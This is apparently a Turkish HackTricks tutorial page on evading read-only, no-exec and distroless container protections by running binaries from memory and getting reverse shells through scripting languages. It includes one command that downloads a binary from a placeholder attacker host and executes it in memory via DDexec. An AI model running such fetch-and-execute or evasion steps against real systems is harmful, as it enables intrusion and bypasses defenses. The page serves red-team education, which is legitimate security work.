# FS korumalarını aşma: yalnızca okunur / çalıştırma yok / Distroless

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Eğer **hacking kariyeri** ile ilgileniyorsanız ve hacklenemez olanı hacklemek istiyorsanız - **işe alıyoruz!** (_akıcı Lehçe yazılı ve sözlü gereklidir_).

{% embed url="https://www.stmcyber.com/careers" %}

## Videolar

Aşağıdaki videolarda bu sayfada bahsedilen teknikleri daha derinlemesine bulabilirsiniz:

* [**DEF CON 31 - Linux Bellek Manipülasyonunu Gizlilik ve Kaçış için Keşfetmek**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**DDexec-ng ile Gizli Sızmalar & Bellek İçi dlopen() - HackTricks Takip 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## yalnızca okunur / çalıştırma yok senaryosu

Linux makinelerinin **yalnızca okunur (ro) dosya sistemi koruması** ile monte edilmesi giderek daha yaygın hale geliyor, özellikle konteynerlerde. Bunun nedeni, ro dosya sistemi ile bir konteyner çalıştırmanın **`readOnlyRootFilesystem: true`** ayarını `securitycontext` içinde ayarlamak kadar kolay olmasıdır:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Ancak, dosya sistemi ro olarak monte edilse bile, **`/dev/shm`** hala yazılabilir olacak, bu yüzden diske hiçbir şey yazamayacağımız yalan. Ancak, bu klasör **çalıştırma yok koruması** ile monte edilecektir, bu nedenle burada bir ikili dosya indirirseniz **onu çalıştıramayacaksınız**.

{% hint style="warning" %}
Kırmızı takım perspektifinden, bu, sistemde zaten olmayan ikili dosyaları **indirmeyi ve çalıştırmayı zorlaştırıyor** (örneğin arka kapılar veya `kubectl` gibi sayıcılar).
{% endhint %}

## En Kolay Aşma: Scriptler

İkili dosyalardan bahsettiğimi unutmayın, eğer yorumlayıcı makine içinde mevcutsa, bir **shell script** veya **python** **script** gibi **herhangi bir scripti** çalıştırabilirsiniz.

Ancak, bu yalnızca ikili arka kapınızı veya çalıştırmanız gereken diğer ikili araçları çalıştırmak için yeterli değildir.

## Bellek Aşmaları

Bir ikili dosyayı çalıştırmak istiyorsanız ancak dosya sistemi buna izin vermiyorsa, bunu **bellekten çalıştırarak** yapmak en iyi yoldur, çünkü **korumalar burada geçerli değildir**.

### FD + exec syscall aşması

Makine içinde bazı güçlü script motorlarına sahipseniz, örneğin **Python**, **Perl** veya **Ruby**, ikili dosyayı belleğe indirmek, bir bellek dosya tanımlayıcısında (`create_memfd` syscall) saklamak, bu korumalardan etkilenmeyecek ve ardından **`exec` syscall** çağrısı yaparak **çalıştırılacak dosya olarak fd'yi belirtmek** mümkündür.

Bunun için [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) projesini kolayca kullanabilirsiniz. Bir ikili dosya geçirebilir ve belirtilen dilde **ikili dosya sıkıştırılmış ve b64 kodlanmış** bir script oluşturur, ardından **bellek fd'sinde** saklamak için `create_memfd` syscall'ını çağırarak ve çalıştırmak için **exec** syscall'ına bir çağrı yaparak **çözme ve açma** talimatları verir.

{% hint style="warning" %}
Bu, PHP veya Node gibi diğer script dillerinde çalışmaz çünkü scriptten ham syscall'ları çağırmanın **varsayılan bir yolu yoktur**, bu nedenle ikili dosyayı saklamak için **bellek fd'si** oluşturmak için `create_memfd` çağrısı yapmak mümkün değildir.

Ayrıca, `/dev/shm` içinde bir dosya ile **normal bir fd** oluşturmak işe yaramaz, çünkü **çalıştırma yok koruması** uygulanacağı için bunu çalıştırmanıza izin verilmeyecektir.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) tekniği, kendi sürecinizin belleğini **`/proc/self/mem`** üzerinden yazma ile **değiştirmenizi** sağlar.

Bu nedenle, sürecin yürüttüğü **montaj kodunu kontrol ederek**, bir **shellcode** yazabilir ve süreci **herhangi bir keyfi kodu çalıştıracak şekilde "mutasyona uğratabilirsiniz"**.

{% hint style="success" %}
**DDexec / EverythingExec**, kendi **shellcode'unuzu** veya **herhangi bir ikili dosyayı** **bellekten** yükleyip **çalıştırmanıza** olanak tanır.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
For more information about this technique check the Github or:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) DDexec'in doğal bir sonraki adımıdır. Bu, **DDexec shellcode demonize edilmiştir**, böylece her seferinde **farklı bir ikili dosya çalıştırmak istediğinizde** DDexec'i yeniden başlatmanıza gerek yoktur, sadece memexec shellcode'u DDexec tekniği aracılığıyla çalıştırabilir ve ardından **yeni ikili dosyaları yüklemek ve çalıştırmak için bu demon ile iletişim kurabilirsiniz**.

**Memexec'i bir PHP ters shell'den ikili dosyaları çalıştırmak için nasıl kullanacağınızla ilgili bir örneği** [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) adresinde bulabilirsiniz.

### Memdlopen

DDexec ile benzer bir amaca sahip olan [**memdlopen**](https://github.com/arget13/memdlopen) tekniği, ikili dosyaları **hafızaya yüklemenin daha kolay bir yolunu** sağlar ve daha sonra bunları çalıştırmanıza olanak tanır. Hatta bağımlılıkları olan ikili dosyaları yüklemeye bile izin verebilir.

## Distroless Bypass

### Distroless nedir

Distroless konteynerler, belirli bir uygulama veya hizmeti çalıştırmak için gerekli olan **en az düzeyde bileşenleri** içerir, örneğin kütüphaneler ve çalışma zamanı bağımlılıkları, ancak paket yöneticisi, shell veya sistem yardımcı programları gibi daha büyük bileşenleri hariç tutar.

Distroless konteynerlerin amacı, **gereksiz bileşenleri ortadan kaldırarak konteynerlerin saldırı yüzeyini azaltmak** ve istismar edilebilecek zafiyet sayısını en aza indirmektir.

### Ters Shell

Bir distroless konteynerde **normal bir shell almak için `sh` veya `bash`** bile bulamayabilirsiniz. Ayrıca `ls`, `whoami`, `id` gibi ikili dosyaları da bulamayacaksınız... genellikle bir sistemde çalıştırdığınız her şey.

{% hint style="warning" %}
Bu nedenle, **ters bir shell** almanız veya sistemi **listelemeniz** mümkün **olmayacaktır**.
{% endhint %}

Ancak, eğer ele geçirilmiş konteyner örneğin bir flask web çalıştırıyorsa, o zaman python yüklüdür ve dolayısıyla bir **Python ters shell** alabilirsiniz. Eğer node çalıştırıyorsa, bir Node rev shell alabilirsiniz ve çoğu **betik dili** ile aynı durum geçerlidir.

{% hint style="success" %}
Betik dilini kullanarak **sistemi listeleyebilirsiniz**.
{% endhint %}

Eğer **`read-only/no-exec`** korumaları yoksa, ters shell'inizi kullanarak **dosya sistemine ikili dosyalarınızı yazabilir** ve **çalıştırabilirsiniz**.

{% hint style="success" %}
Ancak, bu tür konteynerlerde bu korumalar genellikle mevcut olacaktır, ancak **önceki bellek yürütme tekniklerini kullanarak bunları aşabilirsiniz**.
{% endhint %}

**Bazı RCE zafiyetlerini istismar ederek betik dillerinden **ters shell'ler** almak ve hafızadan ikili dosyaları çalıştırmak için **örnekleri** [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) adresinde bulabilirsiniz.

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Eğer **hack kariyeri** ile ilgileniyorsanız ve hacklenemez olanı hacklemek istiyorsanız - **işe alıyoruz!** (_akıcı lehçe yazılı ve sözlü gereklidir_).

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR göndererek hackleme ipuçlarını paylaşın.

</details>
{% endhint %}
